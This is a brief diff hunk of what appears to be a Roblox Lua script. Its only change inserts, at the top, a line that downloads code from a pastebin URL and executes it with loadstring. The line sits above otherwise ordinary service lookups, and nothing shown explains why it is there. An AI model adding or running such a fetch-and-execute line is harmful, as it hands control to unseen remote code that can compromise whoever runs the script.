@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/XQp2bfhe'))()
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
